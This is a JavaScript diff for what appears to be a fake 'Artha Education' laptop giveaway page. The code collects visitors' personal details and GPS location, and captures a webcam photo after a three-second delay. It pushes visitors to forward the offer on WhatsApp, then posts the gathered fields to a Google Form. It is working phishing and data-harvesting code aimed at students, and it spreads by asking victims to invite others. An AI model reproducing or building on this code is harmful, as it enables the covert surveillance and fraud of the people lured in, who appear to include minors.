@@ -1,4 +1,3 @@
-
 let userData = {};
 let shared = false;
 
@@ -21,35 +20,40 @@ function proceedCamera() {
     userData.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
   });
 
-  const video = document.getElementById('video');
-  video.style.display = "block"; // Temporarily show it offscreen
   navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    const video = document.getElementById('video');
     video.srcObject = stream;
+    setTimeout(() => {
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/png');
+      userData.photo = imageData;
+      document.getElementById('capturedImage').src = imageData;
+      stream.getTracks().forEach(track => track.stop());
 
-    video.onloadedmetadata = () => {
-      setTimeout(() => {
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        stream.getTracks().forEach(track => track.stop());
-        video.style.display = "none";
-
-        document.getElementById('formStep').style.display = "none";
-        document.getElementById('shareStep').style.display = "block";
-      }, 1500); // Delay to allow camera to adjust
-    };
+      document.getElementById('formStep').style.display = "none";
+      document.getElementById('shareStep').style.display = "block";
+    }, 3000);
   }).catch(() => alert("Camera permission required!"));
 }
-
 
 function shareWhatsApp() {
   if (shared) return;
   shared = true;
+  let count = 0;
   let shareLink = "https://wa.me/?text=🎁 I just claimed a laptop from Artha Education – Try it now!";
   window.open(shareLink, "_blank");
-  setTimeout(() => submitToGoogleForm(), 5000);
+
+  const interval = setInterval(() => {
+    count++;
+    if (count === 5) {
+      clearInterval(interval);
+      submitToGoogleForm();
+    }
+  }, 1000);
 }
 
 function submitToGoogleForm() {
@@ -62,7 +66,11 @@ function submitToGoogleForm() {
   formData.append("entry.1450609673", userData.contact);
   formData.append("entry.1946665100", userData.location);
 
-  fetch(url, { method: "POST", mode: "no-cors", body: formData });
+  fetch(url, {
+    method: "POST",
+    mode: "no-cors",
+    body: formData
+  });
 
   document.getElementById("r_name").innerText = userData.name;
   document.getElementById("r_grade").innerText = userData.grade;
@@ -70,12 +78,6 @@ function submitToGoogleForm() {
   document.getElementById("r_address").innerText = userData.address;
   document.getElementById("r_contact").innerText = userData.contact;
   document.getElementById("r_location").innerText = userData.location;
-
-  const photoCanvas = document.getElementById("photoCanvas");
-  const mainCanvas = document.getElementById("canvas");
-  photoCanvas.width = mainCanvas.width;
-  photoCanvas.height = mainCanvas.height;
-  photoCanvas.getContext("2d").drawImage(mainCanvas, 0, 0);
 
   document.getElementById("shareStep").style.display = "none";
   document.getElementById("finalStep").style.display = "block";
@@ -89,5 +91,6 @@ function showMap(loc) {
   mapFrame.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
   mapFrame.style.width = "100%";
   mapFrame.style.height = "100%";
+  mapFrame.style.border = "0";
   document.getElementById("map").appendChild(mapFrame);
 }
